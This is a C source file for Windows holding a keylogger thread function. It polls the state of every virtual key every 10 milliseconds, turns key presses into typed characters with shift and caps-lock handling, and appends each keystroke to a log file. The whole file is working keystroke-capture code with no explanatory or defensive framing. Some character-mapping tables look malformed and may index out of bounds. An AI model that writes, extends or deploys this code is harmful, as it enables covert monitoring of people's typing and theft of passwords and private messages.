#include <stdio.h>
#include <windows.h>
#include <stdbool.h>

DWORD WINAPI logg(LPVOID lpParam) {
    int vkey, last_key_state[256] = {0};
    int isCASPLOCK, isNUMLOCK;
    int isL_SHIFT, isR_SHIFT;
    int isPressed;
    char showKey;
    const char NUMCHAR[] = ")!@#$%^&*(";
    const char chars_vn[] = ";=,-./`";
    const char chars_vs[] = ":+<_>?~";
    const char chars_va[] = "[//]/';";
    const char chars_vb[] = "{|}\"";
    const char *KEY_LOG_FILE = (const char*)lpParam;
    FILE *kh;

    while (true) {
        Sleep(10);

        // get key state of caps.num & l_sh/r_sh
        isCASPLOCK = (GetKeyState(VK_CAPITAL) & 0x01) != 0;
        isNUMLOCK = (GetKeyState(VK_NUMLOCK) & 0x01) != 0;
        isL_SHIFT = (GetKeyState(VK_LSHIFT) & 0x80) != 0;
        isR_SHIFT = (GetKeyState(VK_RSHIFT) & 0x80) != 0;

        // checking state of all vkeys
        for (vkey = 0; vkey < 256; vkey++) {
            isPressed = (GetKeyState(vkey) & 0x8000) != 0;
            showKey = (char)vkey;
            if (isPressed == 1 && last_key_state[vkey] == 0) {
                // alphabets
                if (vkey >= 'A' && vkey <= 'Z') {
                    if (isCASPLOCK == 0) {
                        if (isL_SHIFT == 0 && isR_SHIFT == 0) {
                            showKey = (char)(vkey + 0x20);
                        }
                    }
                    else if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = (char)(vkey + 0x20);
                    }
                }
                // num char
                else if (vkey >= '0' && vkey <= '9') {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = NUMCHAR[vkey - '0'];
                    }
                }
                // right num
                else if (vkey >= VK_NUMPAD0 && vkey <= VK_NUMPAD9 && isNUMLOCK == 1) {
                    showKey = (char)(vkey - VK_NUMPAD0 + '0');
                }
                // print char
                else if (vkey >= VK_OEM_1 && vkey <= VK_OEM_3) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = chars_vs[vkey - VK_OEM_1];
                    }
                    else {
                        showKey = chars_vn[vkey - VK_OEM_1];
                    }
                }
                else if (vkey >= VK_OEM_4 && vkey <= VK_OEM_8) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = chars_vb[vkey - VK_OEM_4];
                    }
                    else {
                        showKey = chars_va[vkey - VK_OEM_4];
                    }
                }
                // ./;'][]\n[enter], etc
                else if (vkey == 0x0D) {
                    showKey = (char)0x0A;
                }
                else if (vkey >= 0x6A && vkey <= 0x6F) {
                    showKey = (char)(vkey - 0x40);
                }
                else if (vkey != 0x20 && vkey != 0x09) {
                    showKey = (char)0x00;
                }
                // print captured
                if (showKey != (char)0x00) {
                    kh = fopen(KEY_LOG_FILE, "a");
                    putc(showKey, kh);
                    fclose(kh);
                }
            }
            // save last key state
            last_key_state[vkey] = isPressed;
        }
    }
    return 0;
}

